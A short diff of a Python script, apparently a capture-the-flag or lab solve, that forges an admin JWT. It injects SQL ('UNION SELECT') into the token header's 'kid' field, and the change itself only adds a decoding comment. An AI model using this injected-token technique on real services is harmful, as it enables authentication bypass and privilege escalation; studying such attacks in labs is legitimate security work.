@@ -2,7 +2,7 @@ import base64
 import hmac
 import hashlib
 import json
-token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6IlVOSU9OIFNFTEVDVCAnMSJ9.eyJ1c2VyIjoiYWRtaW4ifQ.2B9ZKzJ3FeJ9yoNLDGKgcxOuo05PwDRzFQ_34CrGteQ"
+token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6IlVOSU9OIFNFTEVDVCAnMSJ9.eyJ1c2VyIjoiYWRtaW4ifQ.2B9ZKzJ3FeJ9yoNLDGKgcxOuo05PwDRzFQ_34CrGteQ" #first b64 decode it
 
 header = {"typ":"JWT","alg":"HS256","kid":"asdfas'UNION SELECT 'rrr"}
 payload = {"user":"admin"}
